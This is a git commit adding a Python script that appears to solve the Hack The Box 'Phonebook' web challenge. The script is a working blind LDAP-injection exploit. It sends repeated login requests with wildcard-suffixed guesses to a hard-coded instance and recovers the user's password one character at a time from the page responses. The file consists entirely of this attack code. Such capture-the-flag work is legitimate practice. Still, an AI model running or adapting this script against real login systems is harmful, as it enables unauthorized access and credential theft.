4d0046b43bec5525340664e5caa6a440ab5265af
pL4sTiC <64149887+tkrebby@users.noreply.github.com>
2020-11-13 09:53:26 -0500

    Create ldap_brute.py

---
+++ Challenges/Web/Phonebook/ldap_brute.py
@@ -0,0 +1,28 @@
+#python3
+
+import re, requests
+
+HTBInstance = "157.245.40.149:31949"
+
+forbidden = {41,42,92}
+loop = True
+password = ''
+
+while loop:
+  for c in range(33,126):
+      if c not in forbidden:
+        try_password = password + chr(c)
+        print(try_password)
+        try_password = try_password + '*'
+        data = {'username':'reese', 'password':try_password}
+        r = requests.post("http://"+HTBInstance+"/login", data=data)
+        if r.status_code != 200:
+            print("ERRO")
+            exit()
+        else:
+            if re.search('Login',r.text) == None: 
+              password = password + chr(c)
+              if chr(c) == '}':
+                  loop = False
+                  print('FINISH: ' + password)
+                  exit()
